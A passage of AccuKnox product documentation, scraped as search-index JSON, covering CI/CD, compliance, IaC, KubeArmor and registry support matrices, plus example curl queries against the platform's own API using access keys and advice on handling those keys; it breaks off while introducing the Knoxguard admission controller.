<p>This document outlines the integration mechanisms (workflow file, plugin, or native integration) and feature availability for key DevOps and security functionalities such as SAST, DAST, Infrastructure-as-Code (IaC) scanning, container security, secrets scanning, and pipeline monitoring.</p> <p>By understanding the support landscape for each CI/CD tool, teams can streamline their pipelines while ensuring compliance, security, and efficiency.</p>"},{"location":"support-matrix/cicd-support-matrix/#integration-types","title":"Integration Types","text":"<p>These are the three supported methods for integrating CI/CD tools with AccuKnox :-</p> <ol> <li> <p>Workflow File:</p> </li> <li> <p>Description: A workflow file is a configuration file within the CI/CD tool where you define the steps of your build, test, and deploy pipeline. It allows you to automate tasks using specific syntax and structure (often YAML or JSON).</p> </li> <li> <p>Plugin Support:</p> </li> <li> <p>Description: This method refers to using external plugins to extend the functionality of the CI/CD tool. Plugins integrate the tool with third-party services or features, such as code scanning, security checks, or deployment to cloud platforms.</p> </li> <li> <p>Native Integration:</p> </li> <li> <p>Description: Native integration refers to the seamless, built-in capability of AccuKnox to directly connect with CI/CD tools and platforms, without the need for external plugins. This method utilizes the internal features of AccuKnox to interact with and manage security policies, scans, and assessments within the CI/CD pipeline.</p> </li> </ol> CI/CD Tool Workflow file (Direct Steps) Plugin Support GitHub Actions Available Available GitLab CI/CD Available Available Jenkins Available Available Azure DevOps Available Available AWS CodePipeline Available Coming Soon Bitbucket Available Available CircleCI Available Available GCP Cloud Build Available Coming Soon Harness Available Coming Soon Repository Native Integration (IaC) GitHub Available GitLab Available Bitbucket Available Azure Repos Coming Soon"},{"location":"support-matrix/cicd-support-matrix/#feature-support-table-plugins","title":"Feature Support Table (Plugins)","text":"CI/CD Tool SAST DAST IaC Scanning Container Scanning Secrets Scanning CI/CD Pipeline Monitoring GitHub Actions Available (v1.0.1) Available (v1.0.0) Available (v0.0.1) Available (v0.0.1) Available (v1.0.0) Available (v0.3.15) GitLab CI/CD Available (v1.0.3) Available (v1.0.3) Available (v1.0.3) Available (v1.0.3) Available (v1.0.3) Coming Soon Jenkins Available Available Available Available Available Coming Soon Azure DevOps Available ( (v1.0.4) Available (v1.0.0) Available (v1.0.7) Available (v1.0.0) Available (v1.0.5) Coming Soon Bitbucket Available (v1.0.5) Available (v1.0.5) Available (v1.0.5) Available (v1.0.5) Available (v1.0.5) Coming Soon CircleCI Available Available Available Available Available Coming Soon Harness Coming Soon Coming Soon Coming Soon Coming Soon Coming Soon Coming Soon"},{"location":"support-matrix/compliance-matrix/","title":"Compliance Matrix","text":"Compliance AWS      Azure      GCP      APRA 234 STANDARD\u2705\u2705\u2705 AVID (AI-SPM)\u2705\u2705\u2705 AWS CIS Benchmark v1.4.0\u2705\u274c\u274c AWS CIS Benchmark v1.5.0\u2705\u274c\u274c AWS CIS Benchmark v2.0.0\u2705\u274c\u274c AWS CIS Benchmark v4.0.1\u2705\u274c\u274c AWS Well-Architected Framework - Security\u2705\u274c\u274c Azure CIS Benchmarks v1.3.0\u274c\u2705\u274c Azure CIS Benchmark v2.0.0\u274c\u2705\u274c Azure CIS Benchmark v3.0\u274c\u2705\u274c BAIT\u2705\u2705\u2705 CMMC - Cybersecurity Maturity Model Certification\u2705\u274c\u274c COPPA\u2705\u2705\u2705 CSCRF SEBI\u2705\u2705\u2705 CSPM Encryption Program\u2705\u2705\u2705 California Consumer Privacy Act (CCPA)\u2705\u2705\u2705 Digital Personal Data Protection (DPDP) Act India\u2705\u2705\u2705 FERPA\u2705\u2705\u2705 FISMA\u2705\u2705\u2705 FedRamp\u2705\u2705\u2705 GCP CIS Benchmarks v1.2.0\u274c\u274c\u2705 GCP CIS Benchmark v2.0.0\u274c\u274c\u2705 GCP CIS Benchmark v3.0\u274c\u274c\u2705 General Data Protection Regulation (GDPR) EU\u2705\u2705\u2705 HIPAA\u2705\u2705\u2705 HITRUST CSF\u2705\u2705\u2705 ISMS-P for AWS\u2705\u274c\u274c ISO 27001 - 2013\u2705\u2705\u2705 ISO 27001 - 2022\u2705\u2705\u2705 ISO 27017\u274c\u2705\u2705 ISO 27018\u2705\u2705\u2705 Korean Financial Security Agency Guidelines\u2705\u2705\u2705 LGPD\u2705\u2705\u2705 MITRE AWS Attack Framework\u2705\u274c\u274c NIST 800-171\u2705\u2705\u2705 NIST CSF\u2705\u2705\u2705 NIST SP 800-53\u2705\u2705\u2705 OWASP Top 10 for LLM (AI-SPM) v2025\u2705\u2705\u2705 PCI\u2705\u2705\u2705 SOC 2 Type II\u2705\u2705\u2705 SOC 3\u2705\u2705\u2705 VAIT\u2705\u2705\u2705 <p>SCHEDULE DEMO</p>"},{"location":"support-matrix/iac/","title":"Accuknox IaC Security Support Matrix","text":"<p>Accuknox provides comprehensive support for Infrastructure as Code (IaC) security scanning, enabling users to analyze their IaC files for misconfigurations, vulnerabilities, and compliance issues. Below is a detailed support matrix outlining the supported formats, file types, and additional features.</p>"},{"location":"support-matrix/iac/#1-supported-iac-frameworks","title":"1. Supported IaC Frameworks","text":"IaC Format Description Terraform Supports both HCL and JSON configurations. Terraform Plan Scans Terraform execution plans. Terraform JSON Supports JSON-based Terraform configurations. Kubernetes YAML Scans Kubernetes manifests for security issues. Helm Charts Scans Helm templates for Kubernetes workloads. Docker File Analyzes Dockerfile for security best practices. CloudFormation YAML and JSON templates are supported. Kustomize Scans Kustomize overlays and resources. Serverless Framework Analyzes serverless configurations for compliance and security. Ansible Covers playbooks, roles, and tasks. Bicep Supports Microsoft Bicep templates. ARM Analyzes Azure Resource Manager templates. AWS CDK Scans AWS Cloud Development Kit projects for misconfigurations."},{"location":"support-matrix/iac/#2-integration-support","title":"2. Integration Support","text":"Integration Description CI/CD Pipelines Supports Jenkins, GitHub Actions, GitLab CI/CD, etc. Extensions GitHub, GitLab, Bitbucket, Jenkins. Accuknox UI GitLab, GitHub, Bitbucket."},{"location":"support-matrix/iac/#3-features-and-coverage","title":"3. Features and Coverage","text":"Feature Description Misconfiguration Detection Identifies insecure configurations. Secrets Detection Scans for hardcoded secrets like API keys, tokens, and passwords. Drift Detection Identifies configuration drift from live environments. <p>Accuknox\u2019s IaC support ensures robust security and compliance checks, empowering teams to identify and remediate issues early in the development lifecycle.</p>"},{"location":"support-matrix/kubearmor-support-matrix/","title":"KubeArmor Support Matrix","text":"<p>KubeArmor supports following types of workloads:</p> <p>1.K8s orchestrated workloads: Workloads deployed as k8s orchestrated containers. In this case, KubeArmor is deployed as a k8s daemonset. Note, KubeArmor supports policy enforcement on both k8s-pods (KubeArmorPolicy) as well as k8s-nodes (KubeArmorHostPolicy).</p> <p>2.VM/Bare-Metals workloads: Workloads deployed on Virtual Machines or Bare Metal i.e. workloads directly operating as host processes. In this case, KubeArmor is deployed in systemd mode.</p>"},{"location":"support-matrix/kubearmor-support-matrix/#kubernetes-support-matrix","title":"Kubernetes Support Matrix","text":"Provider K8s engine OS Image Arch Observability Audit Rules Blocking Rules Network-Segmentation LSM Enforcer Remarks Onprem kubeadm, k0s, k3s, microk8s Distros x86_64, ARM BPFLSM, AppArmor Google GKE COS x86_64 BPFLSM, AppArmor All release channels Google GKE Ubuntu &gt;= 16.04 x86_64 BPFLSM, AppArmor All release channels Microsoft AKS Ubuntu &gt;= 18.04 x86_64 BPFLSM, AppArmor Oracle OKE UEK &gt;=7 x86_64 BPFLSM Oracle Linux Server 8.7 IBM IKS Ubuntu x86_64 BPFLSM, AppArmor Talos Talos k8s Talos x86_64 BPFLSM 1540 AWS EKS Amazon Linux 2 (kernel &gt;=5.8) x86_64 BPFLSM AWS EKS Ubuntu x86_64 AppArmor AWS EKS Bottlerocket x86_64 BPFLSM AWS EKS-Auto-Mode Bottlerocket x86_64 BPFLSM AWS Graviton Ubuntu ARM AppArmor AWS Graviton Amazon Linux 2 ARM SELinux RedHat OpenShift RHEL &lt;=8.4 x86_64 SELinux RedHat OpenShift RHEL &gt;=8.5 x86_64 BPFLSM RedHat MicroShift RHEL &gt;=9.2 x86_64 BPFLSM Rancher RKE SUSE x86_64 BPFLSM, AppArmor Rancher K3S Distros x86_64 BPFLSM, AppArmor Oracle Ampere UEK ARM SELinux 1084 VMware Tanzu TBD x86_64 1064 Mirantis MKE Ubuntu&gt;=20.04 x86_64 AppArmor 1181 Digital Ocean DOKS Debian GNU/Linux 11 (bullseye) x86_64 BPFLSM 1120 Alibaba Cloud Alibaba Alibaba Cloud Linux 3.2104 LTS x86_64 BPFLSM 1650"},{"location":"support-matrix/kubearmor-support-matrix/#supported-linux-distributions","title":"Supported Linux Distributions","text":"<p>Following distributions are tested for VM/Bare-metal based installations:</p> Provider Distro VM / Bare-metal Kubernetes SUSE SUSE Enterprise 15 Full Full Debian Buster / Bullseye Full Full Ubuntu 18.04 / 16.04 / 20.04 Full Full RedHat / CentOS RHEL / CentOS &lt;= 8.4 Full Partial RedHat / CentOS RHEL / CentOS &gt;= 8.5 Full Full Fedora Fedora 34 / 35 Full Full Rocky Linux Rocky Linux &gt;= 8.5 Full Full AWS Amazon Linux 2022 Full Full AWS Amazon Linux 2023 Full Full RaspberryPi (ARM) Debian Full Full ArchLinux ArchLinux-6.2.1 Full Full Alibaba Alibaba Cloud Linux  3.2104 LTS 64 bit Full Full <p>Note Full: Supports both enforcement and observability Partial: Supports only observability</p>"},{"location":"support-matrix/kubearmor-support-matrix/#platform-i-am-interested-is-not-listed-here-what-can-i-do","title":"Platform I am interested is not listed here! What can I do?","text":"<p>Please approach the Kubearmor community on slack or raise a GitHub issue to express interest in adding the support.</p> <p>It would be very much appreciated if you can test kubearmor on a platform not listed above and if you have access to. Once tested you can update this document and raise a PR.</p> <p>SCHEDULE DEMO</p>"},{"location":"support-matrix/private-cloud/","title":"Private Clouds","text":"<p>AccuKnox  Zero Trust Cloud Native Application Protection for Multi-Cloud Environments provides support to the various private cloud platforms like</p> <ul> <li>RedHat OpenShift</li> <li>VMWare Tanzu</li> </ul> <p>SCHEDULE DEMO</p>"},{"location":"support-matrix/public-cloud/","title":"Public Cloud","text":"<p>AccuKnox  Zero Trust Cloud Native Application Protection for Multi-Cloud Environments provides support to the various public cloud platforms like</p> <ul> <li> <p>Amazon Web Services</p> </li> <li> <p>Google Cloud Platform</p> </li> <li> <p>Microsoft Azure</p> </li> </ul> <p>SCHEDULE DEMO</p>"},{"location":"support-matrix/registry/","title":"Registry Scanning Support Matrix","text":"<p>Amazon Elastic Container Registry</p><p>AccuKnox scans Amazon ECR images to identify vulnerabilities and risks, categorizing them by severity. Users can view and remediate these issues via the dashboard.</p> <p>Google Artifact Registry</p><p>Google Artifact Registry images are continuously scanned for vulnerabilities, classified by CVSS scores. AccuKnox provides actionable remediation insights in the dashboard.</p> <p>Azure Container Registry (ACR)</p><p>AccuKnox scans Azure Container Registry images for vulnerabilities, presenting categorized results in the dashboard for easy remediation.</p> <p>Nexus Registry</p><p>AccuKnox continuously scans Sonatype Nexus Registry images for risks, offering real-time insights to secure DevOps environments.</p> <p>DockerHub Registry</p><p>AccuKnox scans Docker Hub images regularly, categorizing vulnerabilities by severity and presenting results for proactive issue resolution.</p> <p>Harbor Registry</p><p>AccuKnox performs scheduled scans of Harbor registries, providing detailed risk insights to address vulnerabilities efficiently.</p> <p>Quay</p><p>Red Hat Quay registries are scanned by AccuKnox to identify vulnerabilities, with actionable results accessible through the dashboard.</p> <p>JFrog Registry</p><p>AccuKnox scans JFrog registries for vulnerabilities, ensuring secure environments in both cloud and air-gapped deployments.</p> <p>AccuKnox seamlessly integrates with popular container registries like Docker Hub, Nexus, GCR, and ECR, enabling users to onboard and scan their registries automatically. Once scanning completes, results are displayed on the Registry Scan Dashboard with prioritized findings for quick remediation.</p> <p>The detailed view provides insights across four tabs\u2014Vulnerabilities, Resources, Sensitive Data, and Layers\u2014to help users analyze and address issues effectively. The scanning process runs in the background, ensuring a smooth experience while delivering comprehensive visibility into vulnerabilities and sensitive data within container registries.</p>"},{"location":"support-matrix/registry/#1-registry-types-supported","title":"1. Registry Types Supported","text":"<p>Accuknox CSPM supports a variety of container registries to ensure seamless vulnerability scanning and sensitive data detection across your environment.</p> Registry Type Authentication Type Notes Docker Hub Registry Basic Authentication Supports Personal, Organization, Docker Trusted Registry AWS ECR IAM-based Authentication Full integration with AWS Elastic Container Registry Google Artifact Registry (GAR) Service Account Authentication Compatible with GCR for container storage Azure Container Registry (ACR) Basic Authentication Supports integration with Azure-based registries Harbor Registry Basic Authentication Open-source registry for cloud-native applications Quay Registry Basic Authentication Red Hat's container registry solution JFrog Registry Basic Authentication Supports both cloud-hosted and self-hosted setups Google Artifact Registry (GAR) Service Account Authentication Google\u2019s advanced container artifact storage solution Sonatype Nexus Repository Basic Authentication Popular repository manager supporting various artifact formats"},{"location":"support-matrix/registry/#2-registry-deployments-supported","title":"2. Registry Deployments Supported","text":"<p>Accuknox offers multiple integration types to cater to diverse infrastructure needs, including cloud-native, on-premises, and hybrid configurations.</p> Integration Type Description Cloud-Native Integrates directly with cloud environments (AWS, Azure, GCP). On-Premises Supports integration with on-prem systems. Hybrid Combines both cloud-native and on-premises configurations."},{"location":"support-matrix/registry/#3-on-prem-scan-modes","title":"3. On-Prem Scan Modes","text":"<p>Accuknox provides flexible deployment modes for on-prem environments to meet scalability and integration requirements.</p> Mode Description Standalone Mode Runs everything on one server; ideal for small or self-contained environments. Cluster Mode Uses multiple servers for better scalability and performance. Agentless Mode Monitors and scans without installing extra software on your servers."},{"location":"support-matrix/registry/#4-scalability","title":"4. Scalability","text":"<p>Accuknox is designed to scale seamlessly as your infrastructure grows, adapting to meet increasing demands.</p> Scaling Type Description Horizontal Scaling Scale by adding more nodes to the environment. Vertical Scaling Scale by upgrading resources (CPU, memory) of existing nodes. <p>SCHEDULE DEMO</p>"},{"location":"support-matrix/vms/","title":"Virtual Machines and Baremetals","text":"<p>AccuKnox cloud security tools also supports virtual machine and baremetal workloads with the help of KVMservice.</p> <p>AccuKnox can enforce virtual machine and baremetal policies security seamlessly and effortlessly with the following features:</p> <ul> <li> <p>discovery of virtual machines / baremetals with the agent installation</p> </li> <li> <p>discovery of processes within the virtual machines</p> </li> <li> <p>automatically discover policies for individual processes or for the entire host.</p> </li> </ul> <p>AccuKnox components including VM specific components are deployed as a part of a VM cluster as daemons, on all nodes where enforcement must happen.</p> <p>SCHEDULE DEMO</p>"},{"location":"use-cases/","title":"Use Cases By Categories","text":""},{"location":"use-cases/#use-cases-by-categories","title":"Use Cases By Categories","text":"<p>CNAPP Overview</p> <p>Vulnerability Management</p> <p>Secrets Scanning</p> <p>AI/ML Security</p> <p>Cloud Security (CSPM)</p> <p>Workload Security (CWPP)</p> <p>DevSecOps</p> <p>K8s Security (KSPM)</p> <p>Cloud</p> <p>VM Security</p> <p>Access Keys</p> <p>IoT/Edge Security</p> <p>5G Control Plane Security</p>"},{"location":"use-cases/5g-security/","title":"5G Security","text":"<p>Learn how AccuKnox leverages KubeArmor to provide 5G security at 5gsec.com</p> <p>     Download 5G Security 1-Pager </p>"},{"location":"use-cases/access-keys/","title":"Querying information using access keys","text":"<p>Access keys allow users to interact with Cloud Workload Protection Platform (CWPP) and Cloud Security Posture Management (CSPM) systems programmatically, replicating most operations available in the user interface (UI). Below are key aspects and best practices for using access keys effectively and securely</p>"},{"location":"use-cases/access-keys/#capabilities-with-access-keys","title":"Capabilities with Access Keys","text":"<ol> <li> <p>Operational Flexibility</p> <ul> <li> <p>Perform a wide range of actions available in the UI.</p> </li> <li> <p>Automate workflows to increase efficiency in security operations.</p> </li> </ul> </li> <li> <p>Data Retrieval</p> <ul> <li> <p>Fetch detailed findings from CWPP endpoints (e.g., runtime threats, vulnerabilities).</p> </li> <li> <p>Query compliance and posture data from CSPM endpoints.</p> </li> </ul> </li> <li> <p>Support for Multiple Data Types</p> <ul> <li> <p>Handle various finding types with specific <code>data_type</code> values:</p> <ul> <li>Examples include <code>Cloud Security Findings</code> (CSPM findings), vulnerability scans (SCA), <code>SQ</code> (security queries), and <code>IaC</code> (Infrastructure as Code findings).</li> </ul> </li> </ul> </li> <li> <p>Bulk Operations</p> <ul> <li> <p>Automate repetitive tasks and bulk actions using programmatic workflows.</p> </li> <li> <p>Streamline processes like remediation, tagging, or status updates.</p> </li> </ul> </li> </ol>"},{"location":"use-cases/access-keys/#pre-requisite","title":"Pre-requisite","text":"<ol> <li> <p>User Access key with relevant permission</p> </li> <li> <p>Tenant id</p> </li> <li> <p>CSPM/CWPP URL for the environment</p> </li> </ol> <p>Please refer to Help-Doc to understand How to create Access_Keys</p> <p>For the CSPM/CWPP URL, you can inspect the network tab and get the URL from there</p> <p>e.g.: cspm.demo.accuknox.com, cwpp.demo.accuknox.com</p>"},{"location":"use-cases/access-keys/#querying-data-from-cwpp-using-automated-script","title":"Querying data from CWPP using automated Script","text":"<p>Users can create scripts to automate various tasks using access keys.\\ These scripts assist users in performing batch-processing tasks by leveraging AccuKnox control plane APIs. For instance:</p> <ul> <li> <p>Exporting runtime policies.</p> </li> <li> <p>Getting Remediation Ticket Reports</p> </li> <li> <p>Checking Node Enrollment</p> </li> </ul>"},{"location":"use-cases/access-keys/#sample-scripts","title":"Sample Scripts","text":"<p>Below are the steps for performing batch processing tasks by leveraging AccuKnox control plane APIs</p>"},{"location":"use-cases/access-keys/#steps","title":"Steps","text":"<ol> <li> <p>Clone the repo </p> </li> <li> <p>In <code>.accuknox.cfg</code> file set <code>tenant_id</code> and <code>access_key</code> as TOKEN and move the <code>.accuknox.cfg</code> file to the current user home directory </p> </li> </ol> <pre><code>#!/bin/bash\n\nBASE_URL=\"demo.accuknox.com\"\nCWPP_URL=\"https://cwpp.$BASE_URL\"\nCSPM_URL=\"https://cspm.$BASE_URL\"\n\n# To get the TENANT_ID and TOKEN, follow:\n# 1. Go to AccuKnox Control Plane\n# 2. Settings -&gt; User-Management -&gt; Select User burger menu -&gt; Get-Access-Key\n# 3. Create the access-key. You will find key/token and tenant-id in the creation flow.\n\n# Note: Best to create the access-key with \"Viewer\" role.\n# For more details check [https://github.com/accuknox/tools/tree/main/api-samples]\nTENANT_ID=SET_TENANT_ID\nTOKEN=\"SET_TOKEN\"\n\nCURLOPTS=\"-s\"\n</code></pre> <p>The environment is now set up, and users can run the scripts to view the results.</p>"},{"location":"use-cases/access-keys/#check-node-enrollment","title":"Check Node Enrollment","text":"<p>To view the number of nodes connected to a cluster execute the <code>checkNodeEnrollment.sh</code> script </p>"},{"location":"use-cases/access-keys/#get-remediation-tickets-report","title":"Get Remediation Tickets Report","text":"<p>To view the remediation ticket report, the User needs to update <code>ak_api</code> in the script</p> <ol> <li>Change <code>status=Opened</code> to <code>Closed/Ongoing/Canceled</code> to view the desired information The queries are case-sensitive. Make sure to use the proper case.</li> </ol> <pre><code>ak_api \"$CSPM_URL/api/v1/tickets?page=1&amp;page_size=20&amp;status=&lt;Opened&gt;&amp;created_before=2024-11-13&amp;created_after=2024-11-05\"\n</code></pre> <ol> <li>Change <code>created_before</code> and <code>created_after</code> dates with relevant dates to view the tickets for a particular period</li> </ol> <pre><code>&amp;created_before=&lt;2024-11-13&gt;&amp;created_after=&lt;2024-11-05&gt;\"\n</code></pre> <p>Now, You can run the script to view the ticket report </p> <p>Users can view comprehensive ticket reports for a specified period, filtered by any status.</p>"},{"location":"use-cases/access-keys/#policy-dump","title":"Policy Dump","text":"<p>To dump all the policies for the onboarded Kubernetes cluster</p> <p></p> <p>Users can find the policies in the <code>POLDUMP</code> folder</p> <p></p>"},{"location":"use-cases/access-keys/#querying-data-from-cwpp-using-manual-commands","title":"Querying data From CWPP using Manual commands","text":""},{"location":"use-cases/access-keys/#setting-up-the-env-variables","title":"Setting up the env variables","text":"<pre><code>env=cwpp.demo.accuknox.com tenant=&lt;tenant_id&gt; token=&lt;access-key&gt;\n</code></pre>"},{"location":"use-cases/access-keys/#query-the-number-of-onboarded-clusters","title":"Query the number of onboarded-clusters","text":"<pre><code>curl -sL \"https://$env/cluster-onboarding/api/v1/get-onboarded-clusters\" -H \"authorization: Bearer $token\" | jq\n</code></pre> <p>Output</p> <p></p>"},{"location":"use-cases/access-keys/#querying-the-count-of-cwpp-policies","title":"Querying the count of CWPP policies","text":"<pre><code>curl -sL \"https://$env/policymanagement/v2/policy-count\" -H \"authorization: Bearer $token\" -d \"{\\\"cluster_id\\\":[$cluster_id]}\" | jq\n</code></pre> <p>Output</p> <pre><code>{ \"total_count\": 2628, \"discovered_count\": 640, \"active_count\": 29, \"inactive_count\": 2599, \"pending_count\": 0, \"ignored_count\": 0, \"changed_count\": 3, \"hardening_count\": 1977, \"custom_count\": 11 }\n</code></pre> <p></p>"},{"location":"use-cases/access-keys/#querying-the-count-of-nodes-for-a-particular-cluster","title":"Querying the count of nodes for a particular cluster","text":""},{"location":"use-cases/access-keys/#steps_1","title":"Steps","text":"<p>Step 1: Query for the cluster_id information</p> <pre><code>curl -sL \"https://$env/cluster-onboarding/api/v1/get-onboarded-clusters\" -H \"authorization: Bearer $token\" | jq\n</code></pre> <p>Output</p> <pre><code>ID=33332 (cluster_id)\n\nClusterName=DO-demo-cluster\n</code></pre> <p></p> <p>Step 2: Querying the number of nodes present in the DO-demo-cluster</p> <p>You can use the <code>cluster_id</code> in the below curl command to fetch the number of nodes present in <code>DO-demo-cluster</code></p> <pre><code>curl -sL \"https://$env/cm/api/v1/cluster-management/nodes-in-cluster\" -H \"authorization: Bearer $token\" -d \"{\\\"cluster_id\\\":[33332]}\" | jq\n</code></pre> <p>Output</p> <p></p>"},{"location":"use-cases/access-keys/#querying-for-the-count-of-policies-for-a-particular-cluster","title":"Querying for the count of policies for a particular cluster","text":"<p>We can find the cluster_id using the above method, then we can query using the below curl command</p> <pre><code>curl -sL \"https://$env/policymanagement/v2/policy-count\" -H \"authorization: Bearer $token\" -d \"{\\\"cluster_id\\\":[33332]}\" | jq\n</code></pre> <p>Output</p> <pre><code>{ \"total_count\": 580, \"discovered_count\": 227, \"active_count\": 26, \"inactive_count\": 554, \"pending_count\": 0, \"ignored_count\": 0, \"changed_count\": 3, \"hardening_count\": 342, \"custom_count\": 11 }\n</code></pre> <p></p>"},{"location":"use-cases/access-keys/#querying-workload-details-for-a-cluster","title":"Querying workload details for a cluster","text":"<pre><code>curl -sL \"https://$env/cm/v2/get-workloads\" -H \"authorization: Bearer $token\" -d \"{\\\"cluster_id\\\":[33332]}\" | jq\n</code></pre> <p>Output</p> <pre><code>{ \"result\": [ { \"id\": 368375, \"type\": \"Pod\", \"name\": \"web-nginx\", \"namespace\": \"default\", \"namespace_id\": 261692, \"cluster_id\": 33332, \"created_at\": \"0001-01-01T00:00:00Z\" }, { \"id\": 368644, \"type\": \"Pod\", \"name\": \"test-pod\", \"namespace\": \"custom\", \"namespace_id\": 267301, \"cluster_id\": 33332, \"created_at\": \"0001-01-01T00:00:00Z\" }, { \"id\": 370362, \"type\": \"Pod\", \"name\": \"test-shell\", \"namespace\": \"default\", \"namespace_id\": 261692, \"cluster_id\": 33332, \"created_at\": \"0001-01-01T00:00:00Z\" }, { \"id\": 402800, \"type\": \"ReplicaSet\", \"name\": \"kubearmor-relay-f4f9b5cfd\", \"namespace\": \"kubearmor\", \"namespace_id\": 261697, \"cluster_id\": 33332, \"created_at\": \"0001-01-01T00:00:00Z\" }, { \"id\": 402801, \"type\": \"ReplicaSet\", \"name\": \"kubearmor-operator-64f668576\", \"namespace\": \"kubearmor\", \"namespace_id\": 261697, \"cluster_id\": 33332, \"created_at\": \"0001-01-01T00:00:00Z\" }, .. .... ...... ] }\n</code></pre>"},{"location":"use-cases/access-keys/#querying-data-from-cspm","title":"Querying data From CSPM","text":"<p>In the case of CSPM, the environment will change from CWPP to CSPM, e.g.: cspm.demo.accuknox.com</p>"},{"location":"use-cases/access-keys/#fetching-details-of-onboarded-cloud-accounts","title":"Fetching details of Onboarded Cloud accounts","text":"<pre><code>curl -sL \"https://$env/api/v1/clouds?page=1&amp;ordering=&amp;search=&amp;page_size=20\" -H \"authorization: Bearer $token\" | jq\n</code></pre> <p>Output</p> <pre><code>{ \"count\": 5, \"next\": null, \"previous\": null, \"results\": [ { \"id\": \"83293ac4-ee7b-4078-8b94-7e98f89d265b\", \"last_execution_date\": \"2024-12-26T01:15:50.070856Z\", \"last_scan_date\": \"2024-12-26T01:27:08.252871Z\", \"name\": \"gcp: accuknox-cnapp\", \"hvac_path\": \"accuknox-cnapp832b\", \"enabled\": true, \"is_active\": false, \"connected\": true, \"connect_date\": \"2024-01-25T05:33:59.447310Z\", \"enabled_date\": \"2024-01-25T05:33:59.447346Z\", \"cloud_type\": \"gcp\", \"cloud_name\": \"accuknox-cnapp\", \"schedule\": { \"date\": \"2024-02-19\", \"start\": \"02:00\", \"timezone\": { \"value\": \"UTC\" }, \"frequency\": { \"value\": \"daily\" }, \"isEnabled\": true, \"repeatEvery\": { \"value\": 1 } }, ] }\n</code></pre>"},{"location":"use-cases/access-keys/#view-aggregated-findings-across-multi-cloud","title":"View aggregated findings across multi-cloud","text":"<pre><code>curl -sL \"https://$env/api/v1/findings?page=1&amp;search=&amp;page_size=20&amp;data_type=cloudsploit&amp;ordering=\" -H \"authorization: Bearer $token\" | jq\n</code></pre> <p>Output</p> <pre><code>{ \"count\": 6314, \"next\": \"https://cspm.demo.accuknox.com/api/v1/findings?data_type=cloudsploit&amp;ordering=&amp;page=2&amp;page_size=20&amp;search=\", \"previous\": null, \"results\": [ { ...... &lt;findings&gt; ...... } ] }\n</code></pre>"},{"location":"use-cases/access-keys/#get-findings-with-high-severity","title":"Get findings with High severity","text":"<p><code>risk_factor=High</code>, In case users want to view Critical, Medium, Or Low risk findings they can change the <code>risk_factor</code> value as required</p> <pre><code>curl -sL \"https://$env/api/v1/findings?page=1&amp;search=&amp;page_size=20&amp;data_type=cloudsploit&amp;ordering=&amp;risk_factor=High\" -H \"authorization: Bearer $token\" | jq\n</code></pre> <p>Output</p> <pre><code>{ \"count\": 641, \"next\": \"https://cspm.demo.accuknox.com/api/v1/findings?data_type=cloudsploit&amp;ordering=&amp;page=2&amp;page_size=20&amp;risk_factor=High&amp;search=\", \"previous\": null, \"results\": [ { ...... &lt;findings&gt; ....... } }\n</code></pre>"},{"location":"use-cases/access-keys/#querying-findings-related-to-asset_type-s3-bucket-with-risk-factor-high","title":"Querying findings related to asset_type S3 Bucket with risk factor High","text":"<pre><code>curl -sL \"https://$env/api/v1/findings?page=1&amp;search=&amp;page_size=20&amp;data_type=cloudsploit&amp;ordering=&amp;risk_factor=High&amp;asset_type=aws_s3_bucket\" -H \"authorization: Bearer $token\" | jq\n</code></pre> <p>Output</p> <pre><code>{ \"count\": 438, \"next\": \"https://cspm.demo.accuknox.com/api/v1/findings?asset_type=aws_s3_bucket&amp;data_type=cloudsploit&amp;ordering=&amp;page=2&amp;page_size=20&amp;risk_factor=High&amp;search=\", \"previous\": null, \"results\": [ { ...... &lt;Findings&gt; ........ } ] }\n</code></pre>"},{"location":"use-cases/access-keys/#searching-for-a-particular-finding","title":"Searching for a particular finding","text":"<p>If a user wants to search for any keyword related to cloud findings, they can use the API endpoint below and use cURL to request a response.</p> <p><code>search=s3%20public%20access</code></p> <p><code>/api/v1/findings?page=1&amp;search=&amp;page_size=20&amp;data_type=cloudsploit&amp;ordering=&amp;search=s3%20public%20access</code></p> <p>Output</p> <pre><code>{ \"count\": 8, \"next\": null, \"previous\": null, \"results\": [ { ...... &lt;Findings&gt; ........ } }\n</code></pre>"},{"location":"use-cases/access-keys/#best-practices-for-secure-access-key-usage","title":"Best Practices for Secure Access Key Usage","text":"<ol> <li> <p>Use Minimal Permissions</p> <ul> <li> <p>Avoid using access keys with administrative privileges unless necessary.</p> </li> <li> <p>Apply the principle of least privilege to reduce risk.</p> </li> </ul> </li> <li> <p>Secure Access Key Storage</p> <ul> <li> <p>Store access keys securely in environments like a secrets manager.</p> </li> <li> <p>Avoid hardcoding keys in scripts or applications.</p> </li> </ul> </li> <li> <p>Audit and Rotate Keys Regularly</p> <ul> <li> <p>Monitor access key usage for suspicious activity.</p> </li> <li> <p>Periodically rotate keys to minimize exposure in case of compromise.</p> </li> </ul> </li> <li> <p>Limit Scope of Access</p> <ul> <li> <p>Restrict access to only the required endpoints and data types.</p> </li> <li> <p>Apply granular access policies where supported.</p> </li> </ul> </li> <li> <p>Avoid Unnecessary Operations</p> <ul> <li> <p>Do not use high-privilege keys for simple queries or non-sensitive actions.</p> </li> <li> <p>Minimize risk by limiting key usage to specific tasks.</p> </li> </ul> </li> </ol>"},{"location":"use-cases/access-keys/#conclusion","title":"Conclusion","text":"<p>Access keys offer a powerful way to interact with CWPP and CSPM platforms, enabling automation, bulk operations, and granular data retrieval. However, ensuring their secure and responsible usage is critical to avoid unintended damage or security breaches. Following these best practices will help users maximize efficiency while maintaining robust security.</p>"},{"location":"use-cases/admission-controller-knoxguard/","title":"Admission Controller Support Using Knoxguard","text":"<p>As Kubernetes adoption continues to surge, securing your clusters becomes critical. Knoxguard, the latest security feature, aims to bolster Kubernetes environment security and compliance through robust policy enforcement. Knoxguard operates independently of any policy engine, offering the flexibility to integrate with your preferred enforcement add on. Currently, Knoxguard supports Kyverno as the policy enforcement engine.</p>"},{"location":"use-cases/admission-controller-knoxguard/#introduction","title":"Introduction","text":""},{"location":"use-cases/admission-controller-knoxguard/#key-features-of-knoxguardadmission-controller","title":"Key Features of Knoxguard/Admission Controller","text":""},{"location":"use-cases/admission-controller-knoxguard/#1-registry-restrictions","title":"1. Registry Restrictions","text":"<p>Registry Restrictions allow you to define rules that either restrict or whitelist specific container registries or patterns at the cluster and namespace levels. This feature ensures that only trusted images are deployed within your Kubernetes clusters, reducing the risk of deploying vulnerable or malicious containers.</p>"},{"location":"use-cases/admission-controller-knoxguard/#2-vulnerability-scan-thresholds-pipeline-feature","title":"2. Vulnerability Scan Thresholds (Pipeline Feature)","text":"<p>Knoxguard enables you to set thresholds for the maximum number of 